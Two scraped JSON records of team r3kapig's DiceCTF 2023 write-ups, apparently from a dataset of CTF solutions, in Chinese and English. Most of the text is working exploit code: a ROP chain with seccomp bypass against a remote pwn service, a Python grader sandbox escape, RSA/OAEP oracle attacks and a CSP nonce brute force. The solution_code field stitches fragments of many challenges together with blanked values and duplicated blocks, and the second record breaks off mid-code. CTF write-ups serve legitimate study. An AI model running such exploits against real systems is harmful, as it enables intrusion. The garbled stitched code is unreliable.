{"id": "r3kapig_writeup_DiceCTF_2023_Writeup_-_CN", "team": "r3kapig", "repo": "writeup", "challenge_name": "DiceCTF 2023 Writeup - CN", "attack_type": "Pwn", "writeup": "# DiceCTF 2023 Writeup - CN\n\n## 前言\n\n本次比赛取得了第二名🥈的成绩,现将师傅们的wp整理如下,与大家交流学习。有意向的师傅欢迎投递简历到`root@r3kapig.com`,我们会及时与您联系.\n\n![](https://imgur.com/KewItPk.png)\n\n## Pwn:\n\n### Bop:\n\n一道简单的栈迁移pwn题，但是设置了沙箱只允许orw。然而用libc中的open函数会调用openat，需要通过syscall来直接调用open，有“syscall;ret”的gadget但是被笔者忽略了，所以笔者只用了syscall gadget来执行open，然后用libc中的read和write输出flag。为了在ROP中正常使用syscall，必须覆写libc中的canary\n\n```python\nfrom pwn import *\n\n#p = process('bop')\np = remote('mc.ax', 30284)\n\npay = b'a'*32 + p64(0x404120-0x8)\npay += p64(0x00000000004013d3+1) #ret\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404090)\npay += p64(0x4010F0) #printf\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100) #bss\npay += p64(0x401100) #gets\npay += p64(0x401364) #leave_ret\n\np.sendline(pay)\n\nlibc_base = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x1ec980\nprint(f'libc_base = {hex(libc_base)}')\n\npay = b'flag.txt'.ljust(32,b'\\x00')\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x0)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(libc_base - 0x2898)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x8)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x0)\npay += p64(libc_base+0x0000000000036174) #pop_rax\npay += p64(0x2) #open\npay += p64(libc_base+0x000000000007f1d2)\npay += p64(libc_base+0x25EE2) #syscall\n\npay += p64(0x0061616161616161) * 13\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x3)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x1)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10e060) #write\n\np.sendline(pay)\n\np.sendline(p64(0x0061616161616161))\n\np.interactive()\n```\n\n### OtterWorld:\n\n这道题比较直接，只有一个地方比较有用.在 `framework/chall/programs/chall/src/lib.rs` 里：\n\n```rust\n#[account(\n    constraint = password.key().as_ref()[..4] == b\"osec\"[..]\n)]\npub password: AccountInfo<'info>,\n```\n\n要解这道题，我们给server的`password`的public key必须要以`osec`开头。每个Solana的公钥都是base58编码的，我们可以从服务器里的记录里查看一些公钥的例子。我们可以随机选一个公钥并把他转换成十进制，然后把前四个数字转换成`osec`的十进制，也就是`111 115 101 99`。最后我们再把修改过的十进制编译回base58。（修改过的公钥例如：`8W4K4D8y1y7nXqNAYc3CtBMWj1dFDJRxrSbqffLTSg8u`）这将是我们发送给服务器的`password`\n\n![](https://imgur.com/CPNEyzZ.png)\n\nexp:\n\n`framework-solve/solve/programs/solve/src/lib.rs`:\n\n```rust\nuse anchor_lang::prelude::*;\nuse anchor_spl::token::Token;\ndeclare_id!(\"osecio1111111111111111111111111111111111111\");\n#[program]\npub mod solve {\n    use super::*;\n\n    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {\n        let get_flag_acc = chall::cpi::accounts::GetFlag {\n            flag:ctx.accounts.state.to_account_info(),\n            password: ctx.accounts.password.to_account_info(),\n            payer: ctx.accounts.payer.to_account_info(),\n            system_program: ctx.accounts.system_program.to_account_info(),\n            rent: ctx.accounts.rent.to_account_info(),\n        };\n        let cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), get_flag_acc);\n        chall::cpi::get_flag(cpi_deposit)?;\n        Ok(())\n    }\n}\n#[derive(Accounts)]\npub struct GetFlag<'info> {\n    #[account(mut)]\n    pub state: AccountInfo<'info>,\n    pub password: AccountInfo<'info>,\n    #[account(mut)]\n    pub payer: Signer<'info>,\n    pub system_program: Program<'info, System>,\n    pub token_program: Program<'info, Token>,\n    pub rent: Sysvar<'info, Rent>,\n    pub chall: Program<'info, chall::program::Chall>\n}\n```\n\n`framework-solve/src/main.rs`:\n\n```rust\nuse chall::anchor_lang::{InstructionData, ToAccountMetas};\nuse chall::FLAG_SEED;\nuse solana_program::pubkey;\nuse solana_program::pubkey::Pubkey;\nuse std::net::TcpStream;\nuse std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};\n\nfn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {\n    let mut line = String::new();\n    reader.read_line(&mut line)?;\n\n    let ret = line\n        .split(':')\n        .nth(1)\n        .ok_or(\"invalid input\")?\n        .trim()\n        .to_string();\n\n    Ok(ret)\n}\n\nfn main() -> Result<(), Box<dyn Error>> {\n    let mut stream = TcpStream::connect(\"127.0.0.1:8080\")?;\n    let mut reader = BufReader::new(stream.try_clone().unwrap());\n    let mut line = String::new();\n    let so_data = fs::read(\"./solve/target/deploy/solve.so\")?;\n    reader.read_line(&mut line)?;\n    writeln!(stream, \"{}\", solve::ID)?;\n    reader.read_line(&mut line)?;\n    writeln!(stream, \"{}\", so_data.len())?;\n    stream.write_all(&so_data)?;\n    let chall_id = chall::ID;\n    let user = Pubkey::from_str(&get_line(&mut reader)?)?;\n    let ix = solve::instruction::GetFlag {};\n    let data = ix.data();\n    let password = Pubkey::from_str(\"8W4K4D8y1y7nXqNAYc3CtBMWj1dFDJRxrSbqffLTSg8u\")?;\n    let state ", "solution_code": "from pwn import *\n\n#p = process('bop')\np = remote('mc.ax', 30284)\n\npay = b'a'*32 + p64(0x404120-0x8)\npay += p64(0x00000000004013d3+1) #ret\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404090)\npay += p64(0x4010F0) #printf\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100) #bss\npay += p64(0x401100) #gets\npay += p64(0x401364) #leave_ret\n\np.sendline(pay)\n\nlibc_base = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x1ec980\nprint(f'libc_base = {hex(libc_base)}')\n\npay = b'flag.txt'.ljust(32,b'\\x00')\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x0)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(libc_base - 0x2898)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x8)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x0)\npay += p64(libc_base+0x0000000000036174) #pop_rax\npay += p64(0x2) #open\npay += p64(libc_base+0x000000000007f1d2)\npay += p64(libc_base+0x25EE2) #syscall\n\npay += p64(0x0061616161616161) * 13\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x3)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x1)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10e060) #write\n\np.sendline(pay)\n\np.sendline(p64(0x0061616161616161))\n\np.interactive()\n\n<?php\n  if (isset($_GET[\"source\"])) highlight_file(__FILE__) && die();\n\n  $name = \"world\";\n  if (isset($_GET[\"name\"]) && is_string($_GET[\"name\"]) && strlen($_GET[\"name\"]) < 128) {\n    $name = $_GET[\"name\"];\n  }\n\n  $nonce = hash(\"crc32b\", $name);\n  header(\"Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';\");\n?>\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>recursive-csp</title>\n  </head>\n  <body>\n    <h1>Hello, <?php echo $name ?>!</h1>\n    <h3>Enter your name:</h3>\n    <form method=\"GET\">\n      <input type=\"text\" placeholder=\"name\" name=\"name\" />\n      <input type=\"submit\" />\n    </form>\n    <!-- /?source -->\n  </body>\n</html>\n\n# DICE 1001\n# Homework 3\n#\n# @author [full name]\n# @student_id [student id]\n#\n# Collaborators:\n# - [list collaborators here]\n#\n# Resources:\n# - [list resources consulted]\n\ndef add(a, b):\n    '''\n    Return the sum of a and b.\n\n    Parameters:\n        a (int): The first number to add.\n        b (int): The second number to add.\n\n    Returns:\n        int: The sum of a and b.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise NotImplementedError\n\n    ###########################\n\ndef longest(words):\n    ...\n\ndef common(a, b):\n    ...\n\ndef favorite():\n    ...\n\ndef factor(n):\n    ...\n\ndef preimage(hash):\n    ...\n\ndef magic():\n    ...\n\n\n{\n    '__name__': '__main__', \n    '__doc__': None, \n    '__package__': None, \n    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f8252a78bd0>, \n    '__spec__': None, \n    '__annotations__': {}, \n    '__builtins__': <module 'builtins' (built-in)>, \n    '__file__': '/app/run', \n    '__cached__': None, \n    'json': <module 'json' from '/usr/local/lib/python3.11/json/__init__.py'>, \n    'sys': <module 'sys' (built-in)>, \n    'TestCase': <class 'unittest.case.TestCase'>, \n    'TestLoader': <class 'unittest.loader.TestLoader'>, \n    'TextTestRunner': <class 'unittest.runner.TextTestRunner'>, \n    'SilentResult': <class 'util.SilentResult'>, \n    'SubmissionImporter': <class 'util.SubmissionImporter'>, \n    'suite': <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[None, \n        None, \n        <test_1_add.TestAdd testMethod=test_add_positive>]>, \n        <unittest.suite.TestSuite tests=[]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_2_longest.TestLongest testMethod=test_longest_empty>, \n        <test_2_longest.TestLongest testMethod=test_longest_multiple>, \n        <test_2_longest.TestLongest testMethod=test_longest_multiple_tie>, \n        <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, \n        <test_3_common.TestCommon testMethod=test_common_empty>, \n        <test_3_common.TestCommon testMethod=test_common_many>, \n        <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, \n        <test_3_common.TestCommon testMethod=test_common_single>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, \n        <test_5_factor.TestFactor testMethod=test_factor_large>, \n        <test_5_factor.TestFactor testMethod=test_factor_small>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, \n        <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, \n        <test_7_magic.TestMagic testMethod=test_magic_b>, \n        <test_7_magic.TestMagic testMethod=test_magic_c>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>]>, \n    'tests': [\n        'test_hidden', \n        'test_magic_a', \n        'test_magic_b', \n        'test_magic_c', \n        'test_preimage_a', \n        'test_preimage_b', \n        'test_factor_bigger', \n        'test_factor_large', \n        'test_factor_small', \n        'test_favorite', \n        'test_common_consecutive', \n        'test_common_empty', \n        'test_common_many', \n        'test_common_nonconsecutive', \n        'test_common_single', \n        'test_longest_empty', \n        'test_longest_multiple', \n        'test_longest_multiple_tie', \n        'test_longest_single', \n        'test_add_mixed', \n        'test_add_negative', \n        'test_add_positive'\n    ], \n    'stack': [], \n    'current': <unittest.suite.TestSuite tests=[\n        None, \n        None, \n        <test_1_add.TestAdd testMethod=test_add_positive>\n    ]>, \n    'test': <test_1_add.TestAdd testMethod=test_add_positive>, \n    'submission': 'import __main__\\r\\n\\r\\ndef add(a, b):\\r\\n    raise BaseException(vars(__main__))', \n    'f': <_io.TextIOWrapper name='/dev/null' mode='w' encoding='utf-8'>, \n    'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, \n    'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>\n}\n\n...\ndef encrypt(pk0, pk1, msg):\n    r = urandom(16)\n    r_prime = strxor(r, msg)\n    ct0 = pk0.encrypt(r, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),\n                         algorithm=hashes.SHA256(), label=None))\n    ct1 = pk1.encrypt(r_prime, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), \n                         algorithm=hashes.SHA256(), label=None))\n    return ct0.hex() + ct1.hex()\n...encrypt:\n                ct = encrypt(pk0, pk1, msg)\n                seen_ct.add(ct)\n...decrypt:\n                in_ct = bytes.fromhex(input(\"ct (512 byte hexstring): \").strip())\n                if len(in_ct) != 512:\n                    print(\"Must be 512 bytes!\")\n                    exit(0)\n                if in_ct in seen_ct:\n                    print(\"Cannot query decryption on seen ciphertext!\")\n                    exit(0)\n                print(decrypt(key0, key1, in_ct).hex())\n...\n\nfrom pwn import *\nimport os\nfrom Crypto.Util.strxor import strxor\nfrom tqdm import trange\n\ndef enc(io,m0,m1):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'1')\n    io.recvuntil(b'm0 (16 byte hexstring):')\n    io.sendline(m0.hex().rjust(32).encode())\n    io.recvuntil(b'm1 (16 byte hexstring):')\n    io.sendline(m1.hex().rjust(32).encode())\n    ret = io.recvline().strip()\n    c1 = bytes.fromhex(ret[:512].decode())\n    c2 = bytes.fromhex(ret[512:].decode())\n    return c1,c2\n\ndef dec(io,c1,c2):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    io.sendline((c1+c2).hex().rjust(1024).encode())\n    ret = io.recvline().strip()\n    print(ret)\n    return bytes.fromhex(ret.decode())\n\ndef guess(io,m0,m1,c_dec):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\ndef exp(io):\n    io.recvuntil(b'pk0 = ')\n    n0 = int(io.recvline().strip())\n    io.recvuntil(b'pk1 = ')\n    n1 = int(io.recvline().strip())\n    m0 = os.urandom(16)\n    m1 = os.urandom(16)\n    c0,c1 = enc(io,m0,m1)\n    c_dec = dec(io,c0,c1)\n    guess(io,m0,m1,c_dec)\n\nio = remote(\"mc.ax\",31493)\nfor _ in trange(128):\n    exp(io)\nio.interactive()\n\np,b = \nPR.<a> = PolynomialRing(GF(p))\nrng = lambda x: (a*x + b)\nf = rng(rng(rng(11))) - 11\n\na1 = f.roots()[0][0]\n\nfrom Crypto.Util.number import *\nR = [ , , ]\nC = [ , , ]\nN = [ , , ]\ne=11\nequation = []\nnl = N\nP.<x>=PolynomialRing(ZZ)\nfor _ in range(len(R)):\n    f = (x*2**(128) + R[_]) ^ e - C[_]\n    equation.append(f)\nmod=1\nfor i in nl:\n    mod*=i\nff=crt(equation,nl)\nQ.<x>=PolynomialRing(Zmod(mod))\nff=Q(ff)\nff=ff.monic()\n\nprint(ff.small_roots(X=2 ** (8 * (53) ) , epsilon=0.03))\n\n        writeln!(stream, \"{}\", meta_str)?;\n        stream.flush()?;\n    }\n    reader.read_line(&mut line)?;\n    writeln!(stream, \"{}\", data.len())?;\n    stream.write_all(&data)?;\n    stream.flush()?;\n    line.clear();\n    while reader.read_line(&mut line)? != 0 {\n        print!(\"{}\", line);\n        line.clear();\n    }\n    Ok(())\n\n\n    for (const c of printables) {\n      for (const d of printables) {\n        for (const e of printables) {\n          const result = script + a + b + c + d + e;\n          const digest = crc(result).toString(16);\n          if (digest === target) {\n            console.log(result);\n            process.exit(0);\n          }\n        }\n      }\n    }\n\n\n    '__name__': '__main__', \n    '__doc__': None, \n    '__package__': None, \n    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f8252a78bd0>, \n    '__spec__': None, \n    '__annotations__': {}, \n    '__builtins__': <module 'builtins' (built-in)>, \n    '__file__': '/app/run', \n    '__cached__': None, \n    'json': <module 'json' from '/usr/local/lib/python3.11/json/__init__.py'>, \n    'sys': <module 'sys' (built-in)>, \n    'TestCase': <class 'unittest.case.TestCase'>, \n    'TestLoader': <class 'unittest.loader.TestLoader'>, \n    'TextTestRunner': <class 'unittest.runner.TextTestRunner'>, \n    'SilentResult': <class 'util.SilentResult'>, \n    'SubmissionImporter': <class 'util.SubmissionImporter'>, \n    'suite': <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[None, \n        None, \n        <test_1_add.TestAdd testMethod=test_add_positive>]>, \n        <unittest.suite.TestSuite tests=[]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_2_longest.TestLongest testMethod=test_longest_empty>, \n        <test_2_longest.TestLongest testMethod=test_longest_multiple>, \n        <test_2_longest.TestLongest testMethod=test_longest_multiple_tie>, \n        <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, \n        <test_3_common.TestCommon testMethod=test_common_empty>, \n        <test_3_common.TestCommon testMethod=test_common_many>, \n        <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, \n        <test_3_common.TestCommon testMethod=test_common_single>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, \n        <test_5_factor.TestFactor testMethod=test_factor_large>, \n        <test_5_factor.TestFactor testMethod=test_factor_small>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, \n        <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, \n        <test_7_magic.TestMagic testMethod=test_magic_b>, \n        <test_7_magic.TestMagic testMethod=test_magic_c>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>]>, \n    'tests': [\n        'test_hidden', \n        'test_magic_a', \n        'test_magic_b', \n        'test_magic_c', \n        'test_preimage_a', \n        'test_preimage_b', \n        'test_factor_bigger', \n        'test_factor_large', \n        'test_factor_small', \n        'test_favorite', \n        'test_common_consecutive', \n        'test_common_empty', \n        'test_common_many', \n        'test_common_nonconsecutive', \n        'test_common_single', \n        'test_longest_empty', \n        'test_longest_multiple', \n        'test_longest_multiple_tie', \n        'test_longest_single', \n        'test_add_mixed', \n        'test_add_negative', \n        'test_add_positive'\n    ], \n    'stack': [], \n    'current': <unittest.suite.TestSuite tests=[\n        None, \n        None, \n        <test_1_add.TestAdd testMethod=test_add_positive>\n    ]>, \n    'test': <test_1_add.TestAdd testMethod=test_add_positive>, \n    'submission': 'import __main__\\r\\n\\r\\ndef add(a, b):\\r\\n    raise BaseException(vars(__main__))', \n    'f': <_io.TextIOWrapper name='/dev/null' mode='w' encoding='utf-8'>, \n    'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, \n    'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>\n\n\n                in_ct = bytes.fromhex(input(\"ct (512 byte hexstring): \").strip())\n                if len(in_ct) != 512:\n                    print(\"Must be 512 bytes!\")\n                    exit(0)\n                if in_ct in seen_ct:\n                    print(\"Cannot query decryption on seen ciphertext!\")\n                    exit(0)\n                print(decrypt(key0, key1, in_ct).hex())\n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    io.sendline((c1+c2).hex().rjust(1024).encode())\n    ret = io.recvline().strip()\n    print(ret)\n    return bytes.fromhex(ret.decode())\n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\n\n    io.recvuntil(b'Enter your option (EDF) >')\n    io.sendline(b'E')\n    io.recvuntil(b'Enter your integer to encrypt >')\n    io.sendline(str(m).encode())\n    c = int(io.recvline().strip())\n    # print(c)\n    return c\n\n\n    io.recvuntil(b'Enter your option (EDF) >')\n    io.sendline(b'D')\n    io.recvuntil(b'Enter your integer to decrypt >')\n    io.sendline(str(c).encode())\n    ret = int(io.recvline().strip())\n    # print(ret)\n    return ret\n\n\n    m2 = m**2\n    m3 = m2 ** 2\n    c1 = enc(io,m)\n    c2 = enc(io,m2)\n    c3 = enc(io,m3)\n    N = GCD(GCD(c1**2-c2,c2**2-c3),c1**4-c3)\n    # print(N)\n\n\n    c = enc(io,tmpn)\n    ret = dec(io,c)\n    print(ret)\n    if ret == tmpn:\n        io.close()\n\n\n        continue\n    else:\n        print(tmpn)\n        print(ret)\n        io.interactive()\n\n\n    def unpad(self, ct_int):\n        \"\"\"Decrypt a message with PKCS#1 OAEP.\n\n\n        # See 7.1.2 in RFC3447\n        modBits = Crypto.Util.number.size(self._key.n)\n        k = ceil_div(modBits,8) # Convert from bits to bytes\n        hLen = self._hashObj.digest_size\n\n\n    count = 0\n    total = len(proot) * len(qroot)\n    t1 = inverse(q, p)\n    t2 = inverse(p, q)\n    for i in proot:\n        for j in qroot:\n            count += 1\n            m = (i * t1 * q + j * t2 * p) % (p * q)\n            \n            assert (pow(m,e,N) == c)\n            try:\n                print( cipher.unpad((m)))\n            except:\n                continue\n\n\n    print('[+] Calculating e-th root...')\n    start = time.time()\n    proot = rthroot(c, e, p)\n    qroot = pow(c,inverse(e,q-1),q)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n    print('[+] Calculating all e-th roots...')\n    start = time.time()\n    all_proot = allroot(e, p, proot)\n    all_qroot = [qroot]# 3 allroot(e, q, qroot)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n    print('[+] CRT cracking...')\n    start = time.time()\n    decrypt(all_proot, all_qroot, p, q)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n\n\n    c_tmp = pk_A.solve_left(A)[:-100]\n    print(\"\\nstart to express\")\n    tmpks = pk_Aexpress(pk_A)\n    ks = tmpks[:,:100]\n    print(\" express done \")\n    ks = ks.stack(Matrix(ZZ,[c_tmp[:100]]))\n    M = Matrix(ZZ,100 + 100 + 1,100 + 100 + 1)\n    M[:101,:101] = identity_matrix(101)  \n    M[:101,101:] = ks\n    M[101:,101:] = q * identity_matrix(100)\n    start_time = time()\n    print(\"start to LLL\")\n    ML = M.LLL()\n    rows = ML[0]\n    print(f\"LLL done at {time()-start_time}\")\n    c_new = [0 for i in range(612)]\n    c_list = Matrix(ZZ,Matrix(GF(q),rows[:100]*tmpks) + Integer(rows[100]) * Matrix(GF(q),c_tmp))[0]\n    for _ in range(512):\n        if c_list[_] == q-1:\n            c_new[_] = -1\n        else:\n            c_new[_] = int(c_list[_])\n    for _ in range(100):\n        if rows[_] == q-1:\n            c_new[_+512] = -1\n        else:\n            c_new[_+512] = int(rows[_])\n\n\n    print(c*pk_A == A)\n\n\n    msg = int(b - c * pk_b )\n    if msg > q//2:\n        msg -= q\n    m = ZZ(msg % p)\n    flag_bytes.append(int(m))\n    print(_,flag_bytes)\n\n\n    ...\n    def encrypt(self, mask):\n        ss0 = apply_iso(mask, invert(self.priv0))\n        ss1 = apply_iso(mask, invert(self.priv1))\n        enc0 = stream(self.msg0, ss0)\n        enc1 = stream(self.msg1, ss1)\n        return enc0, enc1\n        \n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    ct = (c1.hex().rjust(512)+c2.hex().rjust(512)).encode()\n    print(ct)\n    context.log_level='debug'\n    io.sendline(ct)\n\n\n    print(ret)\n    return bytes.fromhex(ret.decode())\n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\n\n            val = mat[col_id][int_1] * bit_flipping\n            ans = recur(mat, col_id + 1, (status | (1 << int_1)))\n            # print(ans)\n            v5 += val * ans\n            bit_flipping = -bit_flipping\n        hehe[col_id][status] = v5\n        return v5\n    except:\n        print(col_id, status)\n        exit(-1)\n\n\n    hehe = [[-1] * 262144] * 18\n    res = recur(matrix, 0, 0)\n    # print(res)\n    start = (650 * i + 649) * 4\n    print(chr((u64(leak[start:start+8]) - res + i) & 0xff), end = '')\n\n\n    print(target[a.index(org[i])], end = '')\n\n\n    struct dummy res, vec;\n    char buf[] = \"00\";\n    vec.p = buf, vec.q = buf + sizeof (buf) - 1, vec.unk = 1;\n    emu((_OWORD *)&res, (long long)&vec);\n    for (int i = 0; i < res.unk; ++i) {\n        printf(\"%02X%c\", ((_BYTE *)res.p)[i], i + 1 == res.unk ? '\\n' : ' ');\n    }\n    printf(\"%p %p %p\\n\", res.p, res.q, res.unk);\n    return 0;\n", "tools": ["sage", "python", "pycryptodome", "gmpy2", "z3"], "file_path": "temp_repos\\r3kapig_writeup\\20230206-DiceCTF2023-CN\\README.md", "file_size": 57172, "scraped_at": "2025-10-26T18:19:26.932552"}
{"id": "r3kapig_writeup_DiceCTF_2023_Writeup_-_EN", "team": "r3kapig", "repo": "writeup", "challenge_name": "DiceCTF 2023 Writeup - EN", "attack_type": "Pwn", "writeup": "# DiceCTF 2023 Writeup - EN\n\n## Preface:\n\nThis competition has won the second place🥈. Now the writeup of the members is sorted out as follows, and we can exchange and learn with you. Interested masters are welcome to submit their resumes to `root@r3kapig.com`, and we will contact you in time.\n\n![](https://imgur.com/KewItPk.png)\n\n## Pwn:\n\n### Bop:\n\nIt's a simple, stack pivot chall, but since seccomp is set, only open, read, and write are available.\nHowever, libc's open actually uses openat syscall, so I can't use it.\n\nYou can run open via the syscall gadget. There was a \"syscall; ret;\" gadget, but I overlooked it, so I just used the syscall gadget.\n\nIn order to use the syscall gadget for ROP, the master canary of libc must be overwritten.\n\n```python\nfrom pwn import *\n\n#p = process('bop')\np = remote('mc.ax', 30284)\n\npay = b'a'*32 + p64(0x404120-0x8)\npay += p64(0x00000000004013d3+1) #ret\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404090)\npay += p64(0x4010F0) #printf\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100) #bss\npay += p64(0x401100) #gets\npay += p64(0x401364) #leave_ret\n\np.sendline(pay)\n\nlibc_base = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x1ec980\nprint(f'libc_base = {hex(libc_base)}')\n\npay = b'flag.txt'.ljust(32,b'\\x00')\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x0)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(libc_base - 0x2898)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x8)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x0)\npay += p64(libc_base+0x0000000000036174) #pop_rax\npay += p64(0x2) #open\npay += p64(libc_base+0x000000000007f1d2)\npay += p64(libc_base+0x25EE2) #syscall\n\npay += p64(0x0061616161616161) * 13\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x3)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x1)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) 